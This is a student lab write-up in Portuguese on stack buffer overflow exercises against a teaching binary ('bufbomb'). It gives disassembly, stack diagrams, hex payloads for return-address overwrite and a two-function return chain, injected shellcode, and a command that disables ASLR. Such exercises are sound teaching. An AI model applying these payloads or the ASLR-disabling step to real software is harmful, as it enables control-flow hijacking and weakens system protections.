# Laboratório 12 - Buffer Overflow Attack

## Questão 1: Buffer Overflow Básico - Desvio para danger()

### Objetivo
Criar uma string de bytes que desvia o controle para a função `danger()` sem passar por `protect()`, sobrescrevendo o endereço de retorno de `getbuf()` na pilha.

### Análise do Código

#### Função getbuf (buf.c)
```c
#define NORMAL_BUFFER_SIZE 32

int getbuf()
{
    char buf[NORMAL_BUFFER_SIZE];
    printf("buf: %p\n", buf);
    Gets(buf);
    return 1;
}
```

### Disassembly de getbuf

Comando utilizado:
```bash
objdump -d bufbomb > bufbomb.d
```

#### Código Assembly de getbuf (endereço 0x40145e):
```assembly
000000000040145e <getbuf>:
  40145e:	f3 0f 1e fa          	endbr64
  401462:	55                   	push   %rbp           # Salva rbp antigo na pilha
  401463:	48 89 e5             	mov    %rsp,%rbp      # Estabelece novo frame pointer
  401466:	48 83 ec 20          	sub    $0x20,%rsp     # Aloca 32 bytes (0x20) para buf
  40146a:	48 8d 45 e0          	lea    -0x20(%rbp),%rax  # buf começa em rbp-0x20
  40146e:	48 89 c6             	mov    %rax,%rsi      # Passa endereço de buf como 2º param
  401471:	48 8d 05 f4 0c 00 00 	lea    0xcf4(%rip),%rax
  401478:	48 89 c7             	mov    %rax,%rdi      # String "buf: %p\n"
  40147b:	b8 00 00 00 00       	mov    $0x0,%eax
  401480:	e8 1b fc ff ff       	call   4010a0 <printf@plt>
  401485:	48 8d 45 e0          	lea    -0x20(%rbp),%rax  # buf em rbp-0x20 novamente
  401489:	48 89 c7             	mov    %rax,%rdi      # Passa buf para Gets
  40148c:	e8 4d fe ff ff       	call   4012de <Gets>
  401491:	b8 01 00 00 00       	mov    $0x1,%eax
  401496:	c9                   	leave                 # Restaura rbp e rsp
  401497:	c3                   	ret                   # Retorna (pega endereço da pilha)
```

### Layout da Pilha

#### Análise do offset de buf em relação a %rbp

Na instrução `40146a: lea -0x20(%rbp),%rax`, o endereço de `buf` é calculado como **rbp - 0x20** (rbp - 32 bytes).

#### Estrutura da pilha durante a execução de getbuf

```
Endereços Crescentes ↓

+---------------------------+ ← %rbp - 32 (0xe0)
|                           |
|      buf[0..31]           |  ← Array de 32 bytes
|      (32 bytes)           |
|                           |
+---------------------------+ ← %rbp (saved %rbp da main)
|    Saved %rbp             |  ← 8 bytes (prologue salvou aqui)
+---------------------------+ ← %rbp + 8
|  Return Address           |  ← 8 bytes (endereço de retorno)
|  (para main)              |     ALVO DO ATAQUE
+---------------------------+ ← %rbp + 16
```

#### Cálculo do Offset

Para sobrescrever o return address, precisamos preencher:
- 32 bytes do array `buf` (de %rbp-32 até %rbp)
- 8 bytes do saved %rbp (de %rbp até %rbp+8)
- Total: 40 bytes de preenchimento

Após os 40 bytes, escrevemos o endereço de `danger()` em little-endian.

### Endereço da Função danger

Do disassembly (`bufbomb.d`):
```assembly
0000000000401206 <danger>:
  401206:	f3 0f 1e fa          	endbr64
  40120a:	55                   	push   %rbp
  ...
```

Endereço de danger: 0x0000000000401206

Em little-endian (x86-64): 06 12 40 00 00 00 00 00

### Construção do Payload

Formato:
- 40 bytes de preenchimento (0x41 = 'A')
- 8 bytes com endereço de danger em little-endian

Representação hexadecimal (conteúdo de s1.txt):
```
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 
41 41 41 41 41 41 41 41 06 12 40 00 00 00 00 00
```

### Teste do Exploit

Criação do arquivo binário:
```bash
python3 - <<'PY' > exploit.bin
import sys
payload = b"A"*40 + b"\x06\x12\x40\x00\x00\x00\x00\x00" + b"\n"
sys.stdout.buffer.write(payload)
PY
```

Execução:
```bash
./bufbomb < exploit.bin
```

Saída obtida:
```
buf: 0x7ffcdaff8d30

danger! you called danger()

-> cannot be called without validation!
Oops!: You executed an illegal instruction
Better luck next time
```

A função `danger()` foi chamada diretamente, sem passar pela validação em `protect()`.

### Conclusão

O ataque de buffer overflow funcionou porque:
1. `Gets()` não valida o tamanho da entrada
2. Sobrescrevemos o return address na pilha com o endereço de `danger()`
3. Quando `getbuf()` executa `ret`, o controle desvia para `danger()`

A mensagem "illegal instruction" aparece porque após executar `danger()`, o programa tenta retornar para um endereço inválido (os bytes 'A' que colocamos após o endereço de danger na pilha).

### Diagrama do Ataque

```
Antes do Gets():
+---------------------------+
| buf (vazio)               | ← 32 bytes
+---------------------------+
| saved %rbp                | ← 8 bytes
+---------------------------+
| return to main (válido)   | ← 8 bytes
+---------------------------+

Após Gets() com payload:
+---------------------------+
| 'A' * 32                  | ← buf completamente preenchido
+---------------------------+
| 'A' * 8                   | ← saved %rbp sobrescrito
+---------------------------+
| 0x0000000000401206        | ← return address sobrescrito
| (endereço de danger)      |    com endereço de danger()
+---------------------------+
```

---

## Questão 2: Evitando Segmentation Fault

### Problema
No item anterior, o programa gerava segmentation fault ao tentar retornar de `danger()`, pois não havia um endereço de retorno válido na pilha.

### Solução
Estender a sequência de bytes para incluir o endereço de `smoke()` após o endereço de `danger()`. Assim, quando `danger()` retornar, o controle irá para `smoke()` que chama `exit()`, terminando o programa elegantemente.

### Endereço de smoke
Do disassembly (`bufbomb.d`):
```assembly
0000000000401267 <smoke>:
  401267:	f3 0f 1e fa          	endbr64
  40126b:	55                   	push   %rbp
  40126c:	48 89 e5             	mov    %rsp,%rbp
  40126f:	48 8d 05 e3 0d 00 00 	lea    0xde3(%rip),%rax
  401276:	48 89 c7             	mov    %rax,%rdi
  401279:	e8 12 fe ff ff       	call   401090 <puts@plt>
  40127e:	bf 00 00 00 00       	mov    $0x0,%edi
  401283:	e8 48 fe ff ff       	call   4010d0 <exit@plt>
```

Endereço de smoke: 0x0000000000401267

Em little-endian: 67 12 40 00 00 00 00 00

### Nova Estrutura da Pilha (stringinvasora2)

```
+---------------------------+ ← %rbp - 32
|                           |
|   40 bytes de zeros       | ← buf[32] + saved_rbp[8]
|                           |
+---------------------------+ ← %rbp + 8 (return de getbuf)
| 0x0000000000401206        | ← endereço de danger()
| (06 12 40 00 00 00 00 00) |
+---------------------------+ ← %rbp + 16 (return de danger)
| 0x0000000000401267        | ← endereço de smoke()
| (67 12 40 00 00 00 00 00) |
+---------------------------+
```

### Conteúdo de stringinvasora2

```
/* 40 bytes de preenchimento */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Endereço de danger (return de getbuf) */
06 12 40 00 00 00 00 00

/* Endereço de smoke (return de danger) */
67 12 40 00 00 00 00 00
```

### Teste

```bash
./hex2raw < stringinvasora2 > stringinvasora2.raw
./bufbomb < stringinvasora2.raw
```

### Resultado

```
buf: 0x7fff51e52d90

danger! you called danger()

-> cannot be called without validation!
Smoke!: You called smoke()
```

O programa agora:
1. Chama `danger()` diretamente (sem validação)
2. Retorna de `danger()` para `smoke()`
3. `smoke()` chama `exit()` e termina elegantemente
4. Nenhum segmentation fault

### Fluxo de Execução

```
main() → getbuf() → [overflow] → danger() → smoke() → exit()
         ↑                           ↑          ↑
         ret para danger      ret para smoke   termina OK
```

### Verificação do Arquivo Raw

```bash
$ hexdump -C stringinvasora2.raw
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000020  00 00 00 00 00 00 00 00  06 12 40 00 00 00 00 00  |..........@.....|
00000030  67 12 40 00 00 00 00 00  0a                       |g.@......|
00000039
```

Total: 57 bytes (40 preenchimento + 8 danger + 8 smoke + 1 newline)

---

## Questão 3: Passando Argumento para Função via Code Injection

### Objetivo
Fazer `getbuf()` "retornar" para a função `fizz()`, passando como argumento o valor inteiro 0x01020304.

### Código de fizz
```c
void fizz(int val)
{
    if (val == 0x01020304) {
        printf("Fizz!: You called fizz(0x%x)\n", val);
    } else
        printf("Misfire: You called fizz(0x%x)\n", val);
    exit(0);
}
```

### Estratégia
1. Inserir código malicioso no início do array `buf`
2. Sobrescrever return de `getbuf` com o endereço de `buf` (forçando execução do código injetado)
3. O código injetado prepara o argumento em `%edi` e faz `ret` para `fizz`

### Passo 1: Criar Código Malicioso (codigo.s)

```assembly
# Código malicioso para passar argumento 0x01020304 para fizz
# O primeiro argumento em x86-64 é passado em %edi

movl $0x01020304, %edi
ret
```

### Passo 2: Compilar e Extrair Bytes de Máquina

```bash
gcc -c codigo.s
objdump -d codigo.o
```

Resultado:
```assembly
codigo.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:   bf 04 03 02 01          mov    $0x1020304,%edi
   5:   c3                      ret
```

Bytes de máquina: bf 04 03 02 01 c3 (6 bytes)

### Passo 3: Obter Endereços Necessários

#### Endereço de fizz (do bufbomb.d)
```assembly
0000000000401288 <fizz>:
  401288:	f3 0f 1e fa          	endbr64
  40128c:	55                   	push   %rbp
  ...
```
Endereço de fizz: 0x0000000000401288

#### Endereço de buf (impresso por getbuf)

Importante: Desabilitar ASLR para garantir endereço fixo:
```bash
sudo sysctl -w kernel.randomize_va_space=0
```

Executar bufbomb para obter o endereço:
```bash
echo "" | ./bufbomb | grep "buf:"
```

Resultado: buf: 0x7fffffffce90

### Passo 4: Estrutura do Payload (stringinvasora3)

```
+---------------------------+ ← buf (0x7fffffffce90)
| bf 04 03 02 01 c3         | ← Código injetado (6 bytes)
+---------------------------+
| 00 00 ... 00              | ← Padding (34 bytes)
+---------------------------+ ← saved %rbp
| 00 00 00 00 00 00 00 00   | ← Sobrescreve saved rbp (8 bytes)
+---------------------------+ ← return de getbuf (%rbp + 8)
| 90 ce ff ff ff 7f 00 00   | ← Endereço de buf (executa código injetado)
+---------------------------+ ← return do código injetado
| 88 12 40 00 00 00 00 00   | ← Endereço de fizz
+---------------------------+
```

### Conteúdo de stringinvasora3

```
/* Código malicioso (6 bytes): movl $0x01020304, %edi; ret */
bf 04 03 02 01 c3

/* Padding: 34 bytes para completar 40 bytes totais */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00

/* Endereço de buf (0x7fffffffce90) em little-endian */
90 ce ff ff ff 7f 00 00

/* Endereço de fizz (0x0000000000401288) em little-endian */
88 12 40 00 00 00 00 00
```

### Teste

```bash
./hex2raw < stringinvasora3 > stringinvasora3.raw
./bufbomb < stringinvasora3.raw
```

### Resultado

```
buf: 0x7fffffffce90
Fizz!: You called fizz(0x1020304)
```

A função `fizz()` foi chamada com o argumento correto 0x01020304.

### Fluxo de Execução

```
1. main() chama getbuf()
2. getbuf() lê entrada maliciosa
3. getbuf() faz ret → desvia para buf (código injetado)
4. Código injetado:
   - Carrega 0x01020304 em %edi
   - Executa ret → pega endereço de fizz da pilha
5. fizz(0x01020304) é executada
6. Imprime "Fizz!: You called fizz(0x1020304)"
7. exit(0)
```

### Diagrama da Pilha Durante o Ataque

```
Antes do overflow:
+---------------------------+ 0x7fffffffce90
| buf (vazio)               |
+---------------------------+
| saved %rbp                |
+---------------------------+
| return to main            |
+---------------------------+

Após overflow e durante execução do código injetado:
+---------------------------+ 0x7fffffffce90 ← %rsp após ret de getbuf
| bf 04 03 02 01 c3 ...     | ← Código sendo executado (movl + ret)
+---------------------------+
| padding...                |
+---------------------------+
| (saved rbp sobrescrito)   |
+---------------------------+
| 0x7fffffffce90 (usado)    | ← Foi usado pelo ret de getbuf
+---------------------------+ ← %rsp após ret do código injetado
| 0x0000000000401288        | ← Endereço de fizz (próximo ret usará este)
+---------------------------+
```

### Verificação do Arquivo Raw

```bash
$ hexdump -C stringinvasora3.raw
00000000  bf 04 03 02 01 c3 00 00  00 00 00 00 00 00 00 00  |................|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020  00 00 00 00 00 00 00 00  90 ce ff ff ff 7f 00 00  |................|
00000030  88 12 40 00 00 00 00 00  0a                       |..@......|
00000039
```

### Pontos-Chave

1. **Code Injection**: Código executável foi inserido na pilha
2. **Convenção de chamada x86-64**: Primeiro argumento inteiro em %edi/%rdi
3. **Cadeia de retornos**: getbuf → código injetado → fizz
4. **ASLR desabilitado**: Necessário para endereço fixo de buf
5. **NX desabilitado**: Pilha precisa ter permissão de execução (o binário permite)

---

## Resumo das Técnicas

| Questão | Técnica | Descrição |
|---------|---------|-----------|
| Q1 | Return-to-function | Sobrescreve return address para desviar para função existente |
| Q2 | Return-to-libc chain | Encadeia múltiplos returns para executar sequência de funções |
| Q3 | Code Injection | Injeta código executável na pilha e desvia controle para ele |

## Arquivos Gerados

- `bufbomb.d` - Disassembly completo do executável
- `codigo.s` - Código assembly malicioso
- `codigo.o` - Arquivo objeto compilado
- `stringinvasora` - Payload Q1 em hexadecimal
- `stringinvasora.raw` - Payload Q1 binário
- `stringinvasora2` - Payload Q2 em hexadecimal
- `stringinvasora2.raw` - Payload Q2 binário
- `stringinvasora3` - Payload Q3 em hexadecimal
- `stringinvasora3.raw` - Payload Q3 binário
